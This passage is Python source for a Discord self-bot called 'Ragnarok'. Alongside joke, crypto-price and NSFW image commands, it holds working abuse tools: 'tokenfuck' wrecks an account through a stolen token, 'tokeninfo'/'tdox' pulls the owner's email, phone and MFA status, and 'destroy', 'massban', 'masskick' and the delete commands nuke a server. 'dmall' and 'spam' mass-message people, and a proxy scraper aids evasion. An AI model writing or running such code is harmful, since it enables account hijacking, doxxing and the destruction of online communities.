    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
          r = requests.get(url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png'   ).convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await Ragnarok.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Ragnarok.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    await ctx.send(f"{user}'s Dick size\n8{dong}D")

@Ragnarok.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house): # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }    
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Ragnarok.command(aliases=['tokenfucker', 'disable', 'crash']) 
async def tokenfuck(ctx, _token): # b'\xfc' 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': BITCH,
        'icon': None,
        'name': "AURA BITCH",
        'region': "europe"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
            else:
                break   

@Ragnarok.command()
async def masslogin(ctx, choice = None): # b'\xfc'
    await ctx.message.delete()
    _masslogin(choice)

@Ragnarok.command()
async def masscon(ctx, _type, amount: int, *, name=None): # b'\xfc'
    await ctx.message.delete()
    payload = {
        'name': name,
        'visibility': 1 
    }
    headers = {
        'Authorization': token,
        'Content-Type':'application/json', 
    }
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        print(f'Avaliable connections: {avaliable}')
    for _i in range(amount):
        try:
            ID = random.randint(10000000, 90000000)
            time.sleep(5) 
            r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
            if r.status_code == 200:
                print(f"[{Fore.GREEN}+{Fore.RESET}] New connection added!")
            else:
                print(f"[{Fore.RED}-{Fore.RESET}] Couldnt add connection!");break
        except (Exception, ValueError) as e:
            print(e);break
    print(f"[{Fore.GREEN}+{Fore.RESET}] Finished adding connections!")

@Ragnarok.command(aliases=['fakeconnection', 'spoofconnection'])
async def fakenet(ctx, _type, *, name = None): # b'\xfc'
    await ctx.message.delete()
    ID  = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    payload = {
        'name': name,
		'visibility': 1
	}
    headers = {
		'Authorization': token,
        'Content-Type':'application/json', 
	}
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after = 3)
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
    if r.status_code == 200:            
        await ctx.send(f"Added connection: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after = 3)
    else:
        await ctx.send('Some error has happened with the endpoint', delete_after = 3)

@Ragnarok.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@Ragnarok.command()
async def copy(ctx): # b'\xfc'
    await ctx.message.delete()
    await Ragnarok.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Ragnarok.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:                
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@Ragnarok.command()
async def destroy(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="WELCOME TO RAGNAROK",
            reason="RAGNAROK ON TOP",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name=RandString())
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())

@Ragnarok.command()
async def dmall(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)    
            await user.send(message)
        except:
            pass

@Ragnarok.command()
async def massban(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@Ragnarok.command()
async def masskick(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    

@Ragnarok.command()
async def massrole(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=RandString(), color=RandomColor())
        except:
            return    

@Ragnarok.command()
async def masschannel(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name=RandString())
        except:
            return

@Ragnarok.command()
async def delchannels(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@Ragnarok.command() 
async def delroles(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@Ragnarok.command()
async def massunban(ctx): # b'\xfc'
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@Ragnarok.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@Ragnarok.command()
async def dm(ctx, user: discord.Member, *, message):
    await ctx.message.delete()
    user = Ragnarok.get_user(user.id)
    if ctx.author.id == Ragnarok.user.id:
        return
    else:
        try:
            await user.send(message)
        except:
            pass   

@Ragnarok.command(name='get-color', aliases=['color', 'colour', 'sc'])
async def _get_color(ctx, *, color: discord.Colour): # b'\xfc'
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'Showing Color: {str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em) 

@Ragnarok.command()
async def tinyurl(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    em = discord.Embed()
    em.add_field(name='Shortened link', value=r, inline=False )
    await ctx.send(embed=em)

@Ragnarok.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role): # b'\xfc'
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break

@Ragnarok.command(name='8ball')
async def ball(ctx, *, question): # b'\xfc'
    await ctx.message.delete()
    responses = [
      'That is a resounding no',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
	  'Maybe',
	  'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)

@Ragnarok.command(aliases=['slots', 'bet'])
async def slot(ctx): # b'\xfc'
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))

@Ragnarok.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@Ragnarok.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid): # b'\xfc'
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1 
            channel = Ragnarok.get_channel(int(channelid))
            await channel.send('!d bump')           
            print(f'{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent'+Fore.RESET)
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Ragnarok.command()
async def tts(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))

@Ragnarok.command()
async def upper(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message.upper()
    await ctx.send(message)

@Ragnarok.command(aliases=['guildpfp'])
async def guildicon(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@Ragnarok.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
async def _backup_f(ctx): # b'\xfc'
    await ctx.message.delete()
    for friend in Ragnarok.user.friends:
       friendlist = (friend.name)+'#'+(friend.discriminator)   
       with open('Backup/Friends.txt', 'a+') as f:
           f.write(friendlist+"\n" )
    for block in Ragnarok.user.blocked:
        blocklist = (block.name)+'#'+(block.discriminator)
        with open('Backup/Blocked.txt', 'a+') as f: 
            f.write(blocklist+"\n" )

@Ragnarok.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None): # b'\xfc'
    await ctx.message.delete()  
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)

@Ragnarok.command()
async def mac(ctx, mac): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('http://api.macvendors.com/' + mac)
    em = discord.Embed(title='MAC Lookup Result', description=r.text, colour=0xDEADBF)
    em.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
    await ctx.send(embed=em)

@Ragnarok.command()
async def abc(ctx): # b'\xfc'
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@Ragnarok.command(aliases=['bitcoin'])
async def btc(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)

@Ragnarok.command(aliases=['ethereum'])
async def eth(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)

@Ragnarok.command()
async def topic(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)

@Ragnarok.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    em = discord.Embed(description=f'{qa}\n{qor}\n{qb}')
    await ctx.send(embed=em)

@Ragnarok.command()
async def hastebin(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@Ragnarok.command()
async def ascii(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@Ragnarok.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_anal.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def erofeet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_erofeet.png"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Ragnarok.command()
async def feet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_feet.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Ragnarok.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_hentai.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_boobs.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        
@Ragnarok.command()
async def classic(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/classic")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_classic.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Ragnarok.command()
async def solo(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/solog")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_solo.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Ragnarok.command()
async def futa(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/futanari")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_futa.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Ragnarok.command()
async def tits(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_tits.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def lewdneko(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_neko.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_lesbian.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def waifu(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def feed(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"exeter_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def tickle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"exeter_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"exeter_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def hug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"exeter_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def cuddle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"exeter_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def smug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"exeter_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def pat(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"exeter_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Ragnarok.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"exeter_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Ragnarok.command(aliases=['proxy'])
async def proxies(ctx): # b'\xfc'
    await ctx.message.delete()
    file = open("Data/Http-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Https-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1000')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
             proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks4-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks5-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1000')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")

@Ragnarok.command()
async def uptime(ctx): # b'\xfc'
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'`'+uptime+'`')

@Ragnarok.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Ragnarok.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@Ragnarok.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def _group_leaver(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in Ragnarok.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@Ragnarok.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=0xFF633B, timestamp=ctx.message.created_at)
        embed.set_author(name="RAGNAROK SELF-BOT | PREFIX: " + str(Ragnarok.command_prefix),
                         icon_url=Ragnarok.user.avatar_url)
        embed.set_thumbnail(url=Ragnarok.user.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/763082791079378995/769240897115258880/imageedit_2_6218835146.gif")
        embed.add_field(name="\u269c\ufe0f `HELP GENERAL`", value="Shows all general commands", inline=True)
        embed.add_field(name="\u269c\ufe0f `HELP GENERAL2`", value="Shows all general page 2 commands", inline=True)
        embed.add_field(name="\ud83d\udd31 `HELP ACCOUNT`", value="Shows all account commands", inline=True)
